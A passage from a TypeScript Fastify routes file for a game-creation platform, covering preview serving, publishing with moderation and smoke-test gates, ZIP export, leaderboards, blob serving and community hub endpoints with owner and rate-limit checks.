    // not this route). (auth M1)
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    const messages = deps.chatRepo ? await deps.chatRepo.list(id) : [];
    return reply.send({ messages });
  });

  // ── game preview file serving ─────────────────────────────────────────────
  // Serves files from a run's snapshot manifest so the iframe can load the game.
  // Route: GET /v1/runs/:id/preview/           → index.html
  //        GET /v1/runs/:id/preview/assets/...  → asset files
  // Owner-only (#30): the run id is unguessable, but we also bind access to the
  // run's owner so an exposed run id can't be replayed by another user. The
  // builder iframe passes ?token= (it can't set headers); query-token is scoped
  // to this route + the SSE stream + the WS routes.

  app.get('/v1/runs/:id/preview/*', async (req, reply) => {
    if (!deps.store) return reply.code(503).send({ error: 'preview_unavailable' });

    const { id } = req.params as { id: string };
    const filePath = (req.params as Record<string, string>)['*'] || '' || 'index.html';
    const cookieValue = previewAuthCookieValue(req);
    const user = await requireUser(req, reply, {
      allowQueryToken: true,
      allowPreviewCookie: true,
    });
    if (!user) return;

    const run = await deps.runRepo.get(id);
    if (!run?.snapshotManifestKey || run.userId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    if (cookieValue) {
      reply.header('Set-Cookie', previewAuthCookieHeader(id, cookieValue));
    }

    try {
      const manifest = await deps.store.readManifest(run.snapshotManifestKey);
      const bytes = await deps.store.readFile(manifest, filePath);
      const ct = contentTypeFor(filePath);
      const isHtml = ct.startsWith('text/html');
      return (
        reply
          .header('Content-Type', ct)
          .header('Cache-Control', 'no-cache')
          // Preview HTML is multi-file, so it can load generated same-origin
          // modules and approved engine CDNs while preserving the same embedding
          // restrictions as the published play route. (CSP M2)
          .header(
            'Content-Security-Policy',
            isHtml
              ? gameContentCsp(deps.allowedFrameOrigins ?? '*', 'preview-multifile')
              : "default-src 'none'",
          )
          .header('X-Content-Type-Options', 'nosniff')
          .header('Referrer-Policy', 'no-referrer')
          .send(Buffer.from(bytes))
      );
    } catch {
      return reply.code(404).send({ error: 'file_not_found', path: filePath });
    }
  });

  // ── publish pipeline ──────────────────────────────────────────────────────
  // POST /v1/projects/:id/publish  — builds a single-file HTML bundle from
  // the project's current snapshot and stores it as a published game.

  app.post('/v1/projects/:id/publish', async (req, reply) => {
    if (!deps.store || !deps.publishRepo) {
      return reply.code(503).send({ error: 'publish_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    if (!project.currentManifestKey) {
      return reply.code(409).send({ error: 'no_snapshot', message: 'Generate a game first.' });
    }

    const engine = (project.engine ?? 'phaser') as 'phaser' | 'three';
    const manifest = await deps.store.readManifest(project.currentManifestKey);

    // Build ZipAsset[] from the manifest — text files as strings, binary as Buffers.
    const TEXT_PREFIXES = ['text/', 'application/json'];
    const files: ExportGameHtmlOptions['files'] = await Promise.all(
      Object.entries(manifest.files).map(async ([path, entry]) => {
        const bytes = await deps.store!.readFile(manifest, path);
        const isText = TEXT_PREFIXES.some((p) => entry.contentType.startsWith(p));
        return {
          path,
          content: isText ? Buffer.from(bytes).toString('utf8') : Buffer.from(bytes),
        };
      }),
    );

    // Inject the configurable "Made with Playforge — Remix this" CTA (#3.2)
    // into the bundle so a shared/embedded game funnels players back to remix.
    // The slug is the play deep-link target; appBaseUrl is configurable.
    const html = await buildGameHtml({
      files,
      engine,
      ...(deps.appBaseUrl !== undefined
        ? { appBaseUrl: deps.appBaseUrl, publishSlug: project.slug }
        : {}),
    });
    const htmlBytes = Buffer.from(html, 'utf8');
    const bundleKey = await deps.store.putBlob(htmlBytes);

    // Persist description + tags + genre on publish (#3.4). The declared GameSpec
    // lives on the published snapshot; lift its genre (for `?genre=` filtering),
    // a one-line description (win condition), and the genre as a discovery tag.
    let gameSpec: import('@playforge/shared').GameSpec | undefined;
    if (project.currentSnapshotId !== null && deps.snapshotRepo) {
      const snap = await deps.snapshotRepo.getById(project.currentSnapshotId);
      gameSpec = snap?.gameSpec ?? undefined;
    }
    const description = gameSpec ? gameSpec.winCondition : undefined;
    const tags = gameSpec ? [gameSpec.genre] : undefined;

    const publishedGame = await deps.publishRepo.upsert({
      projectId: project.id,
      publishSlug: project.slug,
      title: project.name,
      bundleKey,
      // Pin the published snapshot so remix forks this immutable version, not the
      // project's live HEAD (#14). currentSnapshotId is the HEAD at publish time.
      ...(project.currentSnapshotId !== null ? { snapshotId: project.currentSnapshotId } : {}),
      ...(gameSpec !== undefined ? { gameSpec } : {}),
      ...(description !== undefined ? { description } : {}),
      ...(tags !== undefined ? { tags } : {}),
    });

    // Auto-moderation: scan title + bundle for flagged patterns.
    const autoModFlags = autoMod(project.name, html);
    if (autoModFlags.length > 0) {
      console.warn(
        `[publish:automod] game ${publishedGame.publishSlug} flagged: ${autoModFlags.join(', ')}`,
      );
      void deps.hubRepo
        ?.addReport({
          targetType: 'published_game',
          targetId: publishedGame.id,
          reason: `auto-mod: ${autoModFlags.join(', ')}`,
        })
        .catch(() => {});

      // GATE on high-confidence flags (#19): phishing / crypto-mining content must
      // NOT go live automatically — hold it as 'unpublished' (pending review) and
      // return 202 instead of a live URL. (The locked CSP on the served bundle is
      // the real runtime enforcement boundary; this is the pre-publish gate.)
      const HIGH_CONFIDENCE = new Set(['phishing_language', 'crypto_miner']);
      if (autoModFlags.some((f) => HIGH_CONFIDENCE.has(f))) {
        await deps.publishRepo.setStatus(publishedGame.id, 'unpublished');
        return reply.code(202).send({
          status: 'pending_review',
          message:
            'Your game was flagged by automated moderation and is pending review before it goes live.',
          flags: autoModFlags,
        });
      }
    }

    // Smoke-test gate (blocking): verify the game boots in a headless browser
    // before marking it live. If the game fails to boot, mark it unpublished and
    // return a 422 so the user knows to fix the generation.
    if (deps.browserQueue) {
      try {
        const verifyJobId = await deps.browserQueue.enqueueRuntimeVerify(html);
        const verifyResult = await deps.browserQueue.waitForResult<RuntimeVerifyResult>(
          verifyJobId,
          15_000,
        );
        if (verifyResult && !verifyResult.hasGameContract) {
          await deps.publishRepo.setStatus(publishedGame.id, 'unpublished');
          return reply.code(422).send({
            error: 'smoke_test_failed',
            message: 'The game did not boot correctly in our verification environment.',
            fatalErrors: verifyResult.fatalErrors,
          });
        }
        if (verifyResult?.fatalErrors.length) {
          console.warn(
            `[publish:smoke] ${publishedGame.publishSlug} has fatal errors:`,
            verifyResult.fatalErrors,
          );
        }
      } catch (err) {
        // Smoke-test infrastructure error — don't block publish, just log.
        console.warn(`[publish:smoke] verification skipped for ${publishedGame.publishSlug}:`, err);
      }
    }

    // Async: thumbnail capture via browser-worker (best-effort, non-blocking).
    if (deps.browserQueue) {
      void (async () => {
        try {
          const jobId = await deps.browserQueue!.enqueueThumbnail(html);
          const result = await deps.browserQueue!.waitForResult<ThumbnailResult>(jobId, 20_000);
          if (result?.pngBase64 && deps.store) {
            const pngBytes = Buffer.from(result.pngBase64, 'base64');
            const thumbKey = await deps.store.putBlob(pngBytes);
            // putBlob returns a "blobs/<sha256>" key; the /v1/blobs/:key route
            // takes a single bare-hash segment, so strip the prefix for the URL.
            const bareThumbKey = thumbKey.replace(/^blobs\//, '');
            await deps.publishRepo?.setThumbnailUrl(publishedGame.id, `/v1/blobs/${bareThumbKey}`);
            console.log(
              `[publish] thumbnail captured for ${publishedGame.publishSlug} → ${bareThumbKey}`,
            );
          }
        } catch (err) {
          console.warn(`[publish] thumbnail failed for ${publishedGame.publishSlug}:`, err);
        }
      })();
    }

    // Async: index embedding for Hub semantic search (best-effort, non-blocking).
    if (deps.embedText && deps.hubRepo) {
      const textToEmbed = `${project.name}`;
      void deps
        .embedText(textToEmbed)
        .then((embedding) => deps.hubRepo!.setEmbedding(publishedGame.id, embedding))
        .catch(() => {});
    }

    return reply.code(200).send({
      slug: publishedGame.publishSlug,
      publishUrl: `/v1/play/${publishedGame.publishSlug}`,
    });
  });

  // GET /v1/projects/:id/export.zip — download project as a ZIP bundle.

  app.get('/v1/projects/:id/export.zip', async (req, reply) => {
    if (!deps.store) return reply.code(503).send({ error: 'export_unavailable' });
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    if (!project.currentManifestKey) {
      return reply.code(409).send({ error: 'no_snapshot', message: 'Generate a game first.' });
    }
    const manifest = await deps.store.readManifest(project.currentManifestKey);
    const TEXT_PREFIXES = ['text/', 'application/json'];
    const files = await Promise.all(
      Object.entries(manifest.files).map(async ([path, entry]) => {
        const bytes = await deps.store!.readFile(manifest, path);
        const isText = TEXT_PREFIXES.some((p) => entry.contentType.startsWith(p));
        return { path, content: isText ? Buffer.from(bytes).toString('utf8') : Buffer.from(bytes) };
      }),
    );
    const { tmpdir } = await import('node:os');
    const { join } = await import('node:path');
    const { readFile, rm } = await import('node:fs/promises');
    const dest = join(tmpdir(), `playforge-export-${id}-${Date.now()}.zip`);
    try {
      await exportGameZip(dest, {
        files,
        designName: project.name,
        engine: (project.engine as 'three' | 'phaser') ?? 'phaser',
      });
      const zipBytes = await readFile(dest);
      const safeName =
        project.name
          .replace(/[^a-z0-9]+/gi, '-')
          .toLowerCase()
          .slice(0, 40) || 'game';
      return reply
        .header('Content-Type', 'application/zip')
        .header('Content-Disposition', `attachment; filename="${safeName}.zip"`)
        .header('Content-Length', String(zipBytes.length))
        .send(zipBytes);
    } finally {
      void rm(dest, { force: true }).catch(() => {});
    }
  });

  // GET /v1/projects/:id/publish-info — returns the current published state.

  app.get('/v1/projects/:id/publish-info', async (req, reply) => {
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    const published = deps.publishRepo ? await deps.publishRepo.getByProject(id) : null;
    return reply.send({ published });
  });

  // ── public play endpoint ──────────────────────────────────────────────────
  // GET /v1/play/:slug  — serves the published single-file HTML bundle with
  // CSP headers that sandbox the game from the app origin.
  // No auth required — run ID is the capability token; slug is public.

  app.get('/v1/play/:slug', async (req, reply) => {
    if (!deps.store || !deps.publishRepo) {
      return reply.code(503).send({ error: 'play_unavailable' });
    }
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }

    // Fire-and-forget play count increment, throttled per client (#35a) so a
    // reload loop can't inflate the count. The throttle key doubles as a
    // salted-IP session hash for the trending play_events row (#3.3).
    const sessionHash = `${slug}:${req.ip ?? 'anon'}`;
    if (shouldCountPlay(sessionHash)) {
      void deps.hubRepo?.incrementPlayCount(published.id);
      // Record a play event so `?sort=trending` can compute play velocity.
      void deps.hubRepo?.recordPlayEvent({ publishedGameId: published.id, sessionHash });
    }

    let html: string;
    try {
      const bytes = await deps.store.getBlob(published.bundleKey);
      html = Buffer.from(bytes).toString('utf8');
    } catch {
      return reply.code(404).send({ error: 'bundle_not_found' });
    }

    // Shared, locked-down game CSP (see gameContentCsp): connect-src 'none' +
    // non-wildcard img/media so a published game cannot exfiltrate.
    // frame-ancestors restricts embedding to configured app origins (default '*' for local dev).
    const frameAncestors = deps.allowedFrameOrigins ?? '*';
    const csp = gameContentCsp(frameAncestors);

    return reply
      .header('Content-Type', 'text/html; charset=utf-8')
      .header('Content-Security-Policy', csp)
      .header('X-Content-Type-Options', 'nosniff')
      .header('X-Frame-Options', frameAncestors === '*' ? 'ALLOWALL' : 'SAMEORIGIN')
      .header('Referrer-Policy', 'no-referrer')
      .header('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()')
      .header('Cache-Control', 'public, max-age=31536000, immutable')
      .send(html);
  });

  // ── Leaderboards (Phase 3.8) ───────────────────────────────────────────────
  // POST /v1/play/:slug/score {score} — record a leaderboard score. No auth
  // required (anonymous play is allowed); a signed-in submitter is attributed
  // so the board can show a @handle. Rate-capped per salted-IP session so one
  // client can't spam the board (reuses the play-throttle `slug:ip` key shape).

  app.post('/v1/play/:slug/score', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    const body = (req.body ?? {}) as { score?: unknown };
    const score = Number(body.score);
    // Scores are integers; reject NaN/Infinity/floats and absurd magnitudes so a
    // bad client can't poison the board. A 32-bit-ish ceiling is ample.
    if (!Number.isInteger(score) || score < 0 || score > 2_000_000_000) {
      return reply
        .code(400)
        .send({ error: 'invalid_score', message: 'score must be a non-negative integer' });
    }

    // Per-session cap (#3.8): one accepted submission per window per salted-IP
    // session. Reject the spammy ones with 429 rather than silently dropping.
    const sessionHash = `${slug}:${req.ip ?? 'anon'}`;
    if (!shouldAcceptScore(sessionHash)) {
      return reply.code(429).send({ error: 'score_rate_limited' });
    }

    // Attribute the score to the signed-in user when present; anonymous otherwise.
    const user = await authenticateRequest(req);
    await deps.hubRepo.addScore({
      publishedGameId: published.id,
      score,
      ...(user ? { userId: user.userId } : {}),
    });
    return reply.code(201).send({ ok: true });
  });

  // GET /v1/play/:slug/leaderboard — top-10 scores with display handles.
  app.get('/v1/play/:slug/leaderboard', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    const entries = await deps.hubRepo.topScores(published.id, 10);
    return reply.send({ entries });
  });

  // ── blob serving ─────────────────────────────────────────────────────────
  // GET /v1/blobs/:key — serve a content-addressed blob (thumbnails, etc.)
  // The key is the SHA-256 hash of the blob bytes. No auth — keys are unguessable.

  app.get('/v1/blobs/:key', async (req, reply) => {
    if (!deps.store) return reply.code(503).send({ error: 'store_unavailable' });
    const { key } = req.params as { key: string };
    // Reject keys that look path-traversal-y.
    if (!/^[a-f0-9]{16,}$/.test(key)) {
      return reply.code(400).send({ error: 'invalid_key' });
    }
    try {
      // getBlob canonicalizes a bare <sha256> to the stored "blobs/<sha256>" key (#24).
      const bytes = await deps.store.getBlob(key);
      // Sniff PNG/JPEG/WebP/GIF magic bytes for content-type.
      const buf = Buffer.from(bytes);
      let ct: string | null = null;
      if (buf[0] === 0x89 && buf[1] === 0x50) ct = 'image/png';
      else if (buf[0] === 0xff && buf[1] === 0xd8) ct = 'image/jpeg';
      else if (buf.slice(0, 4).toString() === 'RIFF') ct = 'image/webp';
      else if (buf.slice(0, 6).toString() === 'GIF87a' || buf.slice(0, 6).toString() === 'GIF89a')
        ct = 'image/gif';
      // IMAGES ONLY (#35b): this public, unauthenticated route serves thumbnails.
      // Refuse anything that isn't a recognized image so a removed/unpublished
      // game's HTML bundle can never be fetched out-of-band here — only the
      // status-gated /play route serves bundles.
      if (ct === null) {
        return reply.code(415).send({ error: 'unsupported_blob_type' });
      }
      return reply
        .header('Content-Type', ct)
        .header('Cache-Control', 'public, max-age=31536000, immutable')
        .header('X-Content-Type-Options', 'nosniff')
        .send(buf);
    } catch {
      return reply.code(404).send({ error: 'not_found' });
    }
  });

  // ── ZIP download ──────────────────────────────────────────────────────────
  // GET /v1/projects/:id/game.zip  — downloads the current snapshot as a ZIP.

  app.get('/v1/projects/:id/game.zip', async (req, reply) => {
    if (!deps.store) return reply.code(503).send({ error: 'download_unavailable' });
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    if (!project.currentManifestKey) {
      return reply.code(409).send({ error: 'no_snapshot', message: 'Generate a game first.' });
    }

    const manifest = await deps.store.readManifest(project.currentManifestKey);
    const files = await Promise.all(
      Object.entries(manifest.files).map(async ([path, entry]) => {
        const bytes = await deps.store!.readFile(manifest, path);
        const TEXT_PREFIXES = ['text/', 'application/json'];
        const isText = TEXT_PREFIXES.some((p) => entry.contentType.startsWith(p));
        return {
          path,
          content: isText ? Buffer.from(bytes).toString('utf8') : Buffer.from(bytes),
        };
      }),
    );

    const { exportGameArtifact } = await import('@playforge/exporters');
    const tmpPath = join(tmpdir(), `playforge-${randomUUID()}.zip`);
    try {
      await exportGameArtifact('game-zip', tmpPath, {
        files,
        designName: project.name,
        engine: (project.engine ?? 'phaser') as 'phaser' | 'three',
      });
      const { readFile } = await import('node:fs/promises');
      const zipBytes = await readFile(tmpPath);
      const safeName =
        project.name
          .toLowerCase()
          .replace(/[^a-z0-9]+/g, '-')
          .slice(0, 40) || 'game';
      return reply
        .header('Content-Type', 'application/zip')
        .header('Content-Disposition', `attachment; filename="${safeName}.zip"`)
        .send(zipBytes);
    } finally {
      await rm(tmpPath, { force: true }).catch(() => {});
    }
  });

  // ── version timeline ──────────────────────────────────────────────────────
  // GET  /v1/projects/:id/snapshots         — list all snapshots (auth)
  // POST /v1/projects/:id/snapshots/:sid/revert — revert HEAD to snapshot (auth)

  app.get('/v1/projects/:id/snapshots', async (req, reply) => {
    if (!deps.snapshotRepo) return reply.code(503).send({ error: 'snapshots_unavailable' });
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id } = req.params as { id: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    const snapshots = await deps.snapshotRepo.listByProject(id);
    return reply.send({ snapshots });
  });

  app.post('/v1/projects/:id/snapshots/:sid/revert', async (req, reply) => {
    if (!deps.snapshotRepo) return reply.code(503).send({ error: 'snapshots_unavailable' });
    const user = await requireUser(req, reply);
    if (!user) return;
    const { id, sid } = req.params as { id: string; sid: string };
    const project = await deps.repo.get(id);
    if (!project || project.ownerId !== user.userId) {
      return reply.code(404).send({ error: 'not_found' });
    }
    const snapshot = await deps.snapshotRepo.getById(sid);
    if (!snapshot || snapshot.projectId !== id) {
      return reply.code(404).send({ error: 'snapshot_not_found' });
    }
    await deps.repo.setCurrentSnapshot(id, snapshot.id, snapshot.filesManifestKey);
    return reply.send({
      ok: true,
      manifestKey: snapshot.filesManifestKey,
      snapshotId: snapshot.id,
    });
  });

  // ── community hub ─────────────────────────────────────────────────────────
  // GET /v1/hub                       — discovery feed (no auth)
  // GET /v1/hub/games/:slug           — game metadata (no auth)
  // POST /v1/hub/games/:slug/like     — toggle like (auth required)
  // POST /v1/hub/games/:slug/rate     — set rating (auth required)
  // GET /v1/hub/games/:slug/comments  — list comments (no auth)
  // POST /v1/hub/games/:slug/comments — add comment (auth required)
  // POST /v1/hub/games/:slug/remix    — fork into requester's project (auth required)
  // POST /v1/hub/games/:slug/report   — report (auth optional)

  // ── Creator profiles ─────────────────────────────────────────────────────

  // Resolve a public @handle to its owner user id. listByOwner is keyed by user
  // id, NOT handle — passing the handle straight through always returned empty
  // (#29). Returns null + the caller 404s when no such handle exists. Falls back
  // to passthrough when authDb isn't configured (the in-memory test harness).
  async function resolveHandleToOwnerId(handle: string): Promise<string | null> {
    if (!deps.authDb) return handle;
    const { schema: s } = await import('@playforge/db');
    const [u] = await deps.authDb
      .select({ id: s.users.id })
      .from(s.users)
      .where(drizzleEq(s.users.handle, handle.toLowerCase()));
    return u?.id ?? null;
  }

  app.get('/v1/users/:handle', async (req, reply) => {
    const { handle } = req.params as { handle: string };
    const ownerId = await resolveHandleToOwnerId(handle);
    if (ownerId === null) return reply.code(404).send({ error: 'user_not_found' });
    const projects = await deps.repo.listByOwner(ownerId);
    const publicProjects = projects.filter((p) => p.visibility === 'public');
    const accountSettings = deps.accountRepo ? await deps.accountRepo.getSettings(ownerId) : null;
    // Follow stats (Phase 3.9): follower count + whether the (optional) viewer
    // follows this creator. isFollowing is false when unauthenticated.
    const viewer = await authenticateRequest(req);
    const [followerCount, isFollowing] = await Promise.all([
      deps.hubRepo ? deps.hubRepo.countFollowers(ownerId) : Promise.resolve(0),
      deps.hubRepo && viewer
        ? deps.hubRepo.isFollowing(viewer.userId, ownerId)
        : Promise.resolve(false),
    ]);
    return reply.send({
      handle,
      displayName: accountSettings?.displayName ?? handle,
      bio: accountSettings?.bio ?? null,
      avatarUrl: accountSettings?.avatarUrl ?? null,
      projectCount: publicProjects.length,
      followerCount,
      isFollowing,
      projects: publicProjects.map((p) => ({
        id: p.id,
        slug: p.slug,
        name: p.name,
        engine: p.engine,
        createdAt: p.createdAt,
        updatedAt: p.updatedAt,
      })),
    });
  });

  // POST /v1/users/:handle/follow — follow a creator (Phase 3.9). Auth required;
  // self-follow rejected; idempotent via the unique (follower, followee) edge.
  app.post('/v1/users/:handle/follow', async (req, reply) => {
    if (!deps.hubRepo) return reply.code(503).send({ error: 'hub_unavailable' });
    const user = await requireUser(req, reply);
    if (!user) return;
    const { handle } = req.params as { handle: string };
    const followeeId = await resolveHandleToOwnerId(handle);
    if (followeeId === null) return reply.code(404).send({ error: 'user_not_found' });
    if (followeeId === user.userId) {
      return reply.code(400).send({ error: 'cannot_follow_self' });
    }
    await deps.hubRepo.addFollow(user.userId, followeeId);
    const followerCount = await deps.hubRepo.countFollowers(followeeId);
    return reply.send({ following: true, followerCount });
  });

  // DELETE /v1/users/:handle/follow — unfollow (Phase 3.9). Idempotent.
  app.delete('/v1/users/:handle/follow', async (req, reply) => {
    if (!deps.hubRepo) return reply.code(503).send({ error: 'hub_unavailable' });
    const user = await requireUser(req, reply);
    if (!user) return;
    const { handle } = req.params as { handle: string };
    const followeeId = await resolveHandleToOwnerId(handle);
    if (followeeId === null) return reply.code(404).send({ error: 'user_not_found' });
    await deps.hubRepo.removeFollow(user.userId, followeeId);
    const followerCount = await deps.hubRepo.countFollowers(followeeId);
    return reply.send({ following: false, followerCount });
  });

  app.get('/v1/users/:handle/games', async (req, reply) => {
    if (!deps.publishRepo) return reply.code(503).send({ error: 'publish_unavailable' });
    const { handle } = req.params as { handle: string };
    const ownerId = await resolveHandleToOwnerId(handle);
    if (ownerId === null) return reply.code(404).send({ error: 'user_not_found' });
    const q = req.query as Record<string, string | undefined>;
    const limit = Math.min(Number(q['limit'] ?? '20'), 50);
    const offset = Number(q['offset'] ?? '0');
    const games = await deps.publishRepo.listByOwner(ownerId, { limit, offset });
    return reply.send({ handle, games });
  });

  // ── Hub ───────────────────────────────────────────────────────────────────

  app.get('/v1/hub', async (req, reply) => {
    if (!deps.hubRepo) return reply.code(503).send({ error: 'hub_unavailable' });
    const q = req.query as Record<string, string | undefined>;
    const sort =
      q['sort'] === 'popular' ? 'popular' : q['sort'] === 'trending' ? 'trending' : 'recent';
    const limit = Math.min(Math.max(Number(q['limit'] ?? '20'), 1), 100);
    const offset = Math.max(Number(q['offset'] ?? '0'), 0);
    // Discovery filters (#3.4): ?genre= matches the published GameSpec genre,
    // ?tag= matches a persisted discovery tag.
    const genre =
      typeof q['genre'] === 'string' && q['genre'].trim() !== '' ? q['genre'].trim() : undefined;
    const tag =
      typeof q['tag'] === 'string' && q['tag'].trim() !== '' ? q['tag'].trim() : undefined;
    const games = await deps.hubRepo.feed({
      limit,
      offset,
      sort,
      ...(genre !== undefined ? { genre } : {}),
      ...(tag !== undefined ? { tag } : {}),
    });
    return reply.send({ games });
  });

  /**
   * Resolve the published slug of a project's remix parent for attribution
   * (#3.6). Walks: project.remixOfProjectId → that project's published game's
   * slug. Returns null when the project is not a remix or the parent isn't
   * (or no longer) published.
   */
  async function parentSlugFor(projectId: string): Promise<string | null> {
    if (!deps.publishRepo) return null;
    const project = await deps.repo.get(projectId);
    if (!project || project.remixOfProjectId === null) return null;
    const parentPublished = await deps.publishRepo.getByProject(project.remixOfProjectId);
    return parentPublished?.publishSlug ?? null;
  }

  app.get('/v1/hub/games/:slug', async (req, reply) => {
    if (!deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    // Remix lineage (#3.6): how many times this game has been remixed, and the
    // parent slug it was remixed FROM (for "Remix of …" attribution).
    const [remixCount, parentSlug] = await Promise.all([
      deps.hubRepo ? deps.hubRepo.remixCount(published.projectId) : Promise.resolve(0),
      parentSlugFor(published.projectId),
    ]);
    return reply.send({ game: { ...published, remixCount, parentSlug } });
  });

  app.post('/v1/hub/games/:slug/like', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    // No self-likes: likes are weighted heavily in the trending score, so a
    // creator liking their own game is vote-stuffing. (content MEDIUM)
    const likeOwner = await deps.repo.get(published.projectId);
    if (likeOwner && likeOwner.ownerId === user.userId) {
      return reply.code(400).send({ error: 'cannot_like_own' });
    }
    const liked = await deps.hubRepo.toggleLike(user.userId, published.id);
    return reply.send({ liked });
  });

  app.post('/v1/hub/games/:slug/rate', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    const body = (req.body ?? {}) as { stars?: unknown };
    const stars = Number(body.stars);
    if (!Number.isInteger(stars) || stars < 1 || stars > 5) {
      return reply
        .code(400)
        .send({ error: 'invalid_stars', message: 'stars must be an integer 1–5' });
    }
    // No self-ratings: a creator 5★-ing their own game inflates ratingAvg, which
    // drives Hub ranking. Self-follow is already blocked the same way. (content MEDIUM)
    const rateOwner = await deps.repo.get(published.projectId);
    if (rateOwner && rateOwner.ownerId === user.userId) {
      return reply.code(400).send({ error: 'cannot_rate_own' });
    }
    const result = await deps.hubRepo.setRating(user.userId, published.id, stars);
    return reply.send(result);
  });

  app.get('/v1/hub/games/:slug/comments', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    const comments = await deps.hubRepo.listComments(published.id);
    return reply.send({ comments });
  });

  app.post('/v1/hub/games/:slug/comments', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    const body = (req.body ?? {}) as { body?: unknown; parentCommentId?: unknown };
    if (typeof body.body !== 'string' || body.body.trim() === '') {
      return reply.code(400).send({ error: 'body_required' });
    }
    if (body.body.length > MAX_COMMENT_LEN) {
      return reply.code(400).send({ error: 'comment_too_long', max: MAX_COMMENT_LEN });
    }
    const parentCommentId =
      typeof body.parentCommentId === 'string' ? body.parentCommentId : undefined;
    // A reply's parent must belong to THIS game — otherwise a client can thread
    // a reply under a foreign game's comment (orphan/cross-game threading). (content LOW)
    if (parentCommentId !== undefined) {
      const existing = await deps.hubRepo.listComments(published.id);
      if (!existing.some((c) => c.id === parentCommentId)) {
        return reply.code(400).send({ error: 'invalid_parent_comment' });
      }
    }
    const comment = await deps.hubRepo.addComment(
      published.id,
      user.userId,
      body.body.trim(),
      parentCommentId,
    );
    return reply.code(201).send({ comment });
  });

  app.post('/v1/hub/games/:slug/remix', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const user = await requireUser(req, reply);
    if (!user) return;
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published || published.status !== 'live') {
      return reply.code(404).send({ error: 'not_found' });
    }
    const sourceProject = await deps.repo.get(published.projectId);
    if (!sourceProject) {
      return reply.code(404).send({ error: 'source_project_not_found' });
    }

    // Fork the PUBLISHED immutable snapshot's manifest, NOT the source project's
    // live currentManifestKey (#14) — the live HEAD may contain unpublished WIP
    // (edits made after publishing) that must not leak to a remixer. Resolve the
    // pinned snapshot; fall back to the live HEAD only for legacy games published
    // before snapshot-pinning (snapshotId null).
    let remixManifestKey: string | null = null;
    if (published.snapshotId && deps.snapshotRepo) {
      const snap = await deps.snapshotRepo.getById(published.snapshotId);
      remixManifestKey = snap?.filesManifestKey ?? null;
    }
    if (remixManifestKey === null) {
      remixManifestKey = sourceProject.currentManifestKey;
    }

    const newProject = await deps.repo.create({
      ownerId: user.userId,
      name: `Remix of ${published.title}`,
      ...(sourceProject.engine !== null ? { engine: sourceProject.engine } : {}),
      remixOfProjectId: published.projectId,
    });
    if (remixManifestKey !== null) {
      await deps.repo.setCurrentManifestKey(newProject.id, remixManifestKey);
    }

    // Record remix lineage (#3.6): a depth-1 edge source→fork plus the source's
    // ancestor edges at depth+1, so the source's remixCount increments and the
    // full tree stays queryable. Best-effort — never block the fork response.
    await deps.hubRepo
      .addRemixEdge({ ancestorProjectId: published.projectId, descendantProjectId: newProject.id })
      .catch(() => {});

    return reply.code(201).send({
      projectId: newProject.id,
      // Attribution (#3.6): the slug this project was remixed FROM.
